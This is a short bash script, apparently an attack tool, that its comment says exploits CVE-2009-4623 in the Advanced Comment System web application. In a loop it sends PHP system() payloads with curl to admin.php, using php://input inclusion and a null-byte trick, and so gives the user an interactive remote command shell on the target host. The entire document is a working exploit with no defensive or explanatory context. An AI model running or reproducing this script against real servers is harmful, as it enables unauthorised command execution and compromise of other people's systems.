#!/bin/bash
# quick shell for reading commands and exploiting cve-2009-4623 

echo "usage> ./acs-shell.sh <HOST>"

HOST=$1
echo -n '>'
while read CMD; do
    curl -s -d "<?php system('$CMD'); ?>" "http://$HOST/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
    echo
    echo -n '>'
done
